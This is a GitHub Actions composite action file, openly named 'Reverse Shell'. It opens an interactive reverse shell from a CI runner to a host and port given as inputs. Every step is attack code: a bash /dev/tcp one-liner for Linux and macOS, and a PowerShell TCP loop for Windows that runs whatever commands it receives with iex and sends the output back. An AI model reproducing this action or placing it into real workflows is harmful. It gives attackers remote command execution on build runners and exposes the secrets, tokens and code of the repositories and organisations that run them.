name: 'Reverse Shell'
description: 'This sends a reverse shell to a given host / port combination.'
inputs:
  host:
    description: 'The hostname or IP address'
    required: true
  port:
    description: 'The port to reach'
    required: true
runs:
  using: "composite"
  steps:
    - name: 'Send revshell from Linux'
      if: runner.os == 'Linux'
      shell: bash
      run: sh -i >& /dev/tcp/$INPUT_HOST/$INPUT_PORT 0>&1
      env:
        INPUT_HOST: ${{ inputs.host }}
        INPUT_PORT: ${{ inputs.port }}

    - name: 'Send revshell from Windows'
      if: runner.os == 'Windows'
      shell: pwsh
      run: powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient($env:INPUT_HOST, $env:INPUT_PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
      env:
        INPUT_HOST: ${{ inputs.host }}
        INPUT_PORT: ${{ inputs.port }}

    - name: 'Send revshell from MacOS'
      if: runner.os == 'macOS'
      shell: bash
      run: sh -i >& /dev/tcp/$INPUT_HOST/$INPUT_PORT 0>&1
      env:
        INPUT_HOST: ${{ inputs.host }}
        INPUT_PORT: ${{ inputs.port }}
      
